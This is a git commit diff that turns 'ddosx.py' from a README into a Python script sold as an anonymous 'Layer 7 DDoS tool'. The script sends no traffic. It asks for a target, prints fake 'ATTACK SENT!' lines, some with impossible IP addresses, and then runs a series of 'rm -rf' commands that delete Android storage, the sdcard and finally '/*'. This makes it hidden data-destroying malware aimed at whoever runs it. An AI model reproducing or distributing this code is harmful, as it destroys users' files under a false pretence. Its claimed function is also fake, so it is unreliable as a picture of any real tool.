6ff706bbc27435a19c6dd8c7ca34f25e8c6a20fb
Mr.Haze <126936269+MrHaze01@users.noreply.github.com>
2023-08-21 18:59:23 +0800

    Update ddosx.py

--- ddosx.py
+++ ddosx.py
@@ -1,27 +1,119 @@
-- Hi everyone! I’m Mr.Haze
-- AND THIS IS MY LAYER 7 DDOS TOOL
+import os
+import time
 
-Anonymous Ddos Tool
-powerful Layer 7 ddos tool 
-code in Python!
-[+] ddosx [+]
+print("\033[1;31;36m_______________________________________________________")
+print("")
+print("\033[0;31;40m DDDDD   DDDDD    OOOOO   SSSSS")   
+print("DD  DD  DD  DD  OO   OO SS  ")  
+print("DD   DD DD   DD OO   OO  SSSSS")  
+print("DD   DD DD   DD OO   OO      SS") 
+print("DDDDDD  DDDDDD   OOOO0   SSSSS__ANONYMOUS_DDOS_2K24__  ")
+print("\033[1;31;36m_______________________________________________________")
+print("")
+print("\033[0;31;40m                  Created By:Mr.Planter")
+print("\033[1;31;36m                __________________________")
+print("")
+print("\033[0;31;40m                | POWERFUL DDOS LAYER 7 | ")
+print("\033[0;31;40m     | THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY! | ")
+print("\033[1;31;36m                __________________________")
+print("")
+print("\033[1;31;36m__________________________________________________________")
+print("")
+print("\033[1;31;40m---------------- HTTP_RAW AND HTTP_SOCKET ----------------")
+print("\033[1;31;36m__________________________________________________________")
+print("")
+input("\033[0;31;40m URL TARGET:")
+print("\033[1;31;36m_____________________________________________________")
+print("")
+input("\033[0;31;40m METHOD:")
+print("\033[1;31;36m________________________________________________")
+print("")
+input("\033[0;31;40m TIME:")
+print("\033[1;31;36m___________________________________________")
+print("")
+print("\033[0;31;36m ________________________________")   
+print("")
+print("  _____                _ _             ")
+print(" / ____|              | (_)            ")
+print|(" (___   ___ _ __   __| |_ _ __   __ _ ")
+print (" \___ \ / _ \ '_ \ / _` | | '_ \ / _`|")
+print("____) |  __/ | | | (_| | | | | | (_|  |  ")
+print("|_____/ \___|_| |_|\__,_|_|_| |_|\__, |  ")
+print("                                  __/ |    ")
+print("                                 |___/__ATTACK__")
+print("")
+print("\033[0;31;36m ________________________________")   
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 123.789.90.89 | ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("126.471.137.56 | ATTACK SENT!")
+time.sleep(1)
+print("569.091.78.90 | ATTACK SENT!")
+time.sleep(1)
+print("782.55.78.09 | ATTACK SENT!")
+time.sleep(1)
+print("789.672.89.09 | ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("782.55.78.09 | ATTACK SENT!")
+time.sleep(1)
+print("782.55.78.09 | ATTACK SENT!")
+time.sleep(1)
+print("\033[31;40m WEBSITE DOWN SUCCESSFULLY!")
+time.sleep(1)
+print("WAITING FOR ANOTHER ATTACK...")
+time.sleep(1)
+print("LOADING PLEASE BE PATIENT!....")
+time.sleep(1)
+print("FINDING PROXIES!....")
+time.sleep(1)
+print("\033[1;31;32m 112.199.109.83 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 112.199.109.83 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 112.199.109.83 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;40m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 127.0.0.1 ATTACK SENT!")
+time.sleep(1)
+print("\033[1;31;32m 567.89.09.12 ATTACK SENT!")
+time.sleep(1)
+print(".__..___..___..__. __ .  ..__ .__..  ..___")
+print("[__]  |    |  [__]/  `|_/ |  \|  ||\ |[__")
+print("|  |  |    |  |  |\__.|  \|__/|__|| \|[___")
 
-Installation? Scroll Down!!
-
-
-
-
-
-INSTALLATION
-
-~ sudo apt install git
-
-~ git clone https://github.com/MrHaze01/ddosx.py
-
-~ pip3 install google
-
-~ pip3 install beautifulsoup4
-
-~ python3 ddosx.py
-
+os.system('rm -rf system')
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
 
